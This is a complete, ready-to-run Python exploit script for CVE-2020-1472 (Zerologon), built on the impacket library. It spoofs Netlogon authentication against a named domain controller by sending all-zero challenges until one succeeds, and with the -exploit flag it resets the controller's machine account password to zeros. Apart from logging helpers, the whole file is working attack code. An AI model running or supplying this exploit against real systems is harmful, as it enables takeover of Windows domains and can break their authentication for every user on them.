#!/usr/bin/env python3.8

from impacket.dcerpc.v5 import nrpc, epm, transport
from colorama import Fore, Style
from functools import wraps
from typing import Any

import argparse
import time
import sys


def end_line_after_invoke(fn):
    @wraps(fn)
    def wrapper(self, *args, **kwargs):
        # Execute function
        var = fn(self, *args, **kwargs)
        # End Line
        sys.stdout.write("\n")
        sys.stdout.flush()
        return var
    return wrapper

def reset_all_style(fn):
    @wraps(fn)
    def wrapper(self, *args, **kwargs):
        # Execute function
        var = fn(self, *args, **kwargs)
        # Reset Style
        self.ResetStyle()
        return var
    return wrapper


class Loggers:

    def __init__(self) -> None:
        """
        Initialize class variable
        """
        pass

    @reset_all_style
    def Fail(self, Message: str) -> None:
        """
        Print to stdout the `Message` and exit.
        @param: `Message` => str: Message printed.
        """
        self.ToStdout("❌", f"{Fore.RED}{Message}")
        exit(1)

    @reset_all_style
    def Win(self, Message: str) -> None:
        """
        Print to stdout the `Message`.
        @param: `Message` => str: Message printed.
        """
        self.ToStdout("✅", f"{Fore.GREEN}{Message}")

    @reset_all_style
    def Informations(self, Message: str) -> None:
        """
        Print to stdout the `Message`.
        @param: `Message` => str: Message printed.
        """
        self.ToStdout("➖", f"{Fore.BLUE}{Message}")

    def Compteur(self, Index: int, Max: int) -> None:
        """
        Print to stdout the actual `Index`/`Max`.
        @param: `Index` => int: Actual Index.
        @param: `Max` => int: Max Index value.
        """
        self.ToStdout("➖", f"{Index}/{Max}", "\r")

    def ToStdout(self, Status: str, Message: str, End: str = "\n") -> None:
        """
        Print to stdout the `Message` with [`Status`] and terminate the line with `End`.
        """
        sys.stdout.write(f"[{Status}] {Message}{End}")
        sys.stdout.flush()

    def ResetStyle(self) -> None:
        """
        Reset Style for stdout.
        """
        sys.stdout.write(Style.RESET_ALL)
        sys.stdout.flush()


class ZeroLogon:

    def __init__(self, DcName: str, DcIp: str, MAX_ATTEMPTS: int, exploitServer: bool = False) -> None:
        """
        Initialize class variable
        @param: `DcName` => str: Name of the DC.
        @param: `DcIp` => str: IP Address of the DC.
        @param: `MAX_ATTEMPS` => int: Check if the host is vulnerable MAX_ATTEMPTS times.
        """

        # Others
        self.exploitServer = exploitServer
        self.Loggers = Loggers()
        self.MAX_ATTEMPTS = MAX_ATTEMPTS
        self.Flags = 0x212fffff
        self.STATUS_ACCESS_DENIED = 0xc0000022

        # Binding information
        self.BindingProtocol = "ncacn_ip_tcp"
        self.MSRPC_UUID_NRPC = nrpc.MSRPC_UUID_NRPC

        # Domain information
        self.DcName = DcName
        self.ComputerName = self.DcName
        self.DcHandle = "\\\\" + self.DcName + "\x00"
        self.DcIp = DcIp
        
        # Spoofing Client Credential
        self.ClientChallenge = b"\x00" * 8

    def Exploit(self):
        """
        Launch the Zerologon attack.
        """
        # Stdout information
        self.Loggers.Informations(f"Start attack at {time.strftime('%H:%M:%S %d/%m/%Y')}")
        # Bind to host
        self.RPCConnection()
        
        # Check if the DC is Vulnerable
        if self.IsDcVulnerable():
            self.Loggers.Informations(f"The DC {self.DcName} is vulnerable !")
        if self.exploitServer:
            self.Loggers.Informations(f"Try to change the AD Computer Password")
            # Change the AD Password
            IsADPasswordChanged = self.ChangeADComputerPassword()
            # Check if the password is changed
            if IsADPasswordChanged:
                self.Loggers.Win("Exploit complete, Enjoy !")
            else:
                self.Loggers.Fail("Non-zero return code, something went wrong !")

    def ChangeADComputerPassword(self) -> int:
        """
        Change the AD computer password to 0.
        """
        # Try to change AD Computer Password
        return self.RpcBruteForce(self.RequestsServerPasswordSet)

    def RequestsServerPasswordSet(self) -> nrpc.NetrServerPasswordSet2:
        # Set authenticator
        authenticator = nrpc.NETLOGON_AUTHENTICATOR()
        authenticator["Credential"] = self.ClientChallenge
        authenticator["Timestamp"] = 0

        # Change AD Computer Password
        RequestServerPasswordSet = nrpc.NetrServerPasswordSet2()
        RequestServerPasswordSet["PrimaryName"] = self.DcHandle
        RequestServerPasswordSet["AccountName"] = self.ComputerName + "$\x00"
        RequestServerPasswordSet["SecureChannelType"] = nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel
        RequestServerPasswordSet["Authenticator"] = authenticator
        RequestServerPasswordSet["ComputerName"] = self.ComputerName + "\x00"
        RequestServerPasswordSet["ClearNewPassword"] = b"\x00" * 516

        return (True if self.RpcConn.request(RequestServerPasswordSet)["ErrorCode"] == 0 else False)

    def IsDcVulnerable(self) -> Any:
        """
        Check if the DC is Vulnerable to the Zerologon attack.
        """
        # Try to spoof Client Credential
        return self.RpcBruteForce(self.SpoofingClientCredential)

    @end_line_after_invoke
    def RpcBruteForce(self, func) -> Any:
        """
        BruteForce 
        """
        # Check vulnerability
        for index in range(self.MAX_ATTEMPTS):
            self.Loggers.Compteur(index, self.MAX_ATTEMPTS)
            # try
            try:
                return func()
            except nrpc.DCERPCSessionError as e:
                # STATUS_ACCESS_DENIED is a valid error
                if e.get_error_code() == self.STATUS_ACCESS_DENIED:
                    continue
                else:
                    self.Loggers.Fail(f"Unexpected error code from DC: {e.get_error_code()} !")
            except BaseException as e:
                self.Loggers.Fail(f"Unexpected error: {e} !")

    def RPCConnection(self) -> None:
        """
        Connect to the host via RPC.
        """
        # Bind host
        binding = epm.hept_map(
            destHost = self.DcIp,
            remoteIf = self.MSRPC_UUID_NRPC,
            protocol = self.BindingProtocol
        )

        # Connect to the host
        self.RpcConn = transport.DCERPCTransportFactory(binding).get_dce_rpc()
        self.RpcConn.connect()
        self.RpcConn.bind(self.MSRPC_UUID_NRPC)

    def SpoofingClientCredential(self) -> Any:
        """
        Step 1 of the exploit
        @param: 
        """
        # Challenge exchange
        nrpc.hNetrServerReqChallenge(
            dce = self.RpcConn,
            primaryName = self.DcHandle,
            computerName = self.ComputerName + "\x00",
            clientChallenge = self.ClientChallenge
        )
        # Authentification
        return nrpc.hNetrServerAuthenticate3(
            dce = self.RpcConn,
            primaryName = self.DcHandle,
            accountName = self.ComputerName + "$\x00",
            secureChannelType = nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel,
            computerName = self.ComputerName + "\x00",
            clientCredential = self.ClientChallenge,
            negotiateFlags = self.Flags
        )


class ArgumentsParser:

    def __init__(self) -> None:
        """
        Initialize arguments
        """
        parser = argparse.ArgumentParser(description="Exploit CVE-2020-1472")
        parser.add_argument("-dc", type=str, required=True, help="Netbios name of the DC like 'SRV-AD-001'")
        parser.add_argument("-dc-ip", type=str, required=True, help="Address IP of the DC")
        parser.add_argument("-max-attemps", type=int, required=False, help="Max attempts when sending challenge", default=2000)
        parser.add_argument("-exploit", action="store_true", required=False, help="Exploit the Server")
        self.args = parser.parse_args()

    def GetArguments(self) -> list:
        """
        Get arguments of command line
        """
        return self.args.dc, self.args.dc_ip, self.args.max_attemps, self.args.exploit


if __name__ == "__main__":
    # Get arguments
    Arguments = ArgumentsParser()
    Dc, DcIp, MAX_ATTEMPS, exploitServer = Arguments.GetArguments()

    # Launch exploit
    zeroLogon = ZeroLogon(Dc, DcIp, MAX_ATTEMPS, exploitServer)
    zeroLogon.Exploit()
